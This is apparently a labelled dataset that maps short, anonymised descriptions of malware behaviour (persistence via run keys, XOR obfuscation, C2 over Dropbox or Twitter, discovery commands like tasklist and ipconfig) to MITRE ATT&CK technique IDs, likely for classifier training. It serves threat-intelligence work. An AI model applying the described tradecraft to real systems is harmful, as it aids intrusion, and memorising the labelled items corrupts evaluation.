text1	labels
uses rundll32 within  entries to execute malicious DLLs.	['T1218.011']
uses run keys for persistence on Windows	['T1547.001']
"uses scheduled tasks typically named ""Watchmon Service"" for persistence."	['T1053.005']
uses scripts to enumerate IP ranges on the victim network.  has also issued the command net view /domain to a  implant to gather information about remote systems on the network.	['T1018']
uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.	['T1574.001']
"uses services.exe to register a new autostart service named ""Audit Service"" using a copy of the local lsass.exe file."	['T1569.002', 'T1543.003']
uses single-byte XOR obfuscation to obfuscate many of its files.	['T1027']
uses SSL/TLS and RC4 to encrypt traffic.	['T1573']
uses SSL to encrypt its communication with its C2 server.	['T1071']
uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA).	['T1027']
uses svchost.exe to execute a malicious DLL included in a new service group.	['T1569.002']
uses systeminfo on a victim’s machine.	['T1082']
uses tasklist /v to check running processes.	['T1057']
uses the API call ShellExecuteW for execution.	['T1106']
uses the Camellia cipher to encrypt communications.	['T1573']
uses the certutil command to decode a payload file.	['T1140']
uses the command line.	['T1059']
uses the command line and rundll32.exe to execute.	['T1059']
uses the command-line interface.	['T1059']
uses the command-line interface to execute arbitrary commands.	['T1059']
uses the command prompt to execute commands on the victim's machine.	['T1059']
uses the command reg query “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\InternetSettings”.	['T1012']
uses the Confuser protector to obfuscate an embedded .Net Framework assembly used for C2.  also encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings.	['T1027']
uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the  malware.	['T1105']
uses the Dropbox cloud storage service for command and control.	['T1102']
uses the email platform, Naver, for C2 communications, leveraging SMTP.	['T1071']
uses the filename owaauth.dll, which is a legitimate file that normally resides in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\Auth\; the malicious file by the same name is saved in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\bin\.	['T1036']
uses the Invoke-Obfuscation framework to obfuscate their PowerShell and also performs other code obfuscation.	['T1027']
uses the ipconfig /all command to gather the victim’s IP address.	['T1016']
uses the ipconfig command.	['T1016']
uses the keychaindump project to read securityd memory.	['T1555.002']
uses the Microsoft  utility to list processes running on systems.	['T1057']
uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.	['T1018']
uses the net user command.	['T1087']
uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\Intel\Skype.	['T1123', 'T1125']
uses the tasklist to view running processes on the victim’s machine.	['T1057']
uses the Windows API call, CreateProcessW(), to manage execution flow.	['T1106']
uses  to clean up the environment and attempt to prevent detection.	['T1070.004']
uses  to execute a payload or commands on a remote host.	['T1569.002']
uses  to inject shellcode into PowerShell.	['T1059.001']
uses Twitter as a backup C2 method. It also has a module designed to post messages to the Russian VKontakte social media site.	['T1102']
uses variations of a simple XOR encryption routine for C&C communications.	['T1573']
uses various WMI queries to check if the sample is running in a sandbox.	['T1047']
uses VBScripts and batch scripts.	['T1064']
uses VNC to connect into systems.	['T1021']
uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page.	['T1185']
uses Web shells on publicly accessible Web servers to access victim networks.	['T1505.003']
uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.	['T1047', 'T1518.001']
uses WMI to check for anti-virus software installed on the system.	['T1518.001']
uses WMI to perform discovery techniques.	['T1047']
uses XOR with random keys for its communications.	['T1573']
uses ZPP, a .NET console program, to compress files with ZIP.	['T1560']
variants can add malicious DLL modules as new services.	['T1543.003']
variants can use ports 443, 8443, and 8080 for communications.	['T1043']
variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe, as well as by adding a new service named OfficeUpdateService.	['T1036']
variants have communicated with C2 servers over HTTP and HTTPS.	['T1071']
Variants of  achieve persistence by using DLL search order hijacking, usually by copying the DLL file to %SYSTEMROOT% (C:\WINDOWS\ntshrui.dll).	['T1574.001']
"Variants of  encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the ""srand"" and ""rand"" functions."	['T1027']
Variants of  have added Run Registry keys to establish persistence.	['T1547.001']
Variants of  have used rundll32.exe in Registry values added to establish persistence.	['T1218.011']
variants reported on in 2014 and 2015 used a simple XOR cipher for C2.	['T1573']
Various implementations of  communicate with C2 over HTTP, SMTP, and POP3.	['T1071']
Various  malware enumerates logged-on users.	['T1033']
version of  adds a registry key to HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run for persistence.	['T1547.001']
"versions are signed with various valid certificates; one was likely faked and issued by Comodo for ""Solid Loop Ltd,"" and another was issued for ""Ultimate Computer Support Ltd."""	['T1553.002']
was added to a legitimate, signed version 5.33 of the CCleaner software and distributed on CCleaner's distribution site.	['T1195']
was distributed through a compromised update to a Tor client with a coin miner payload.	['T1195']
was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure.	['T1189']
was likely obfuscated using Invoke-Obfuscation.	['T1027']
When a document is found matching one of the extensions in the configuration,  uploads it to the C2 server.	['T1020']
When it first starts,  crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.	['T1005']
When it first starts,  crawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.	['T1039']
will attempt to detect if the infected host is configured to a proxy. If so,  will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.	['T1008']
will attempt to detect if the infected host is configured to a proxy. If so,  will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.  will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2. Adversaries can also use  to establish an RDP connection with a controller over TCP/7519.	['T1071']
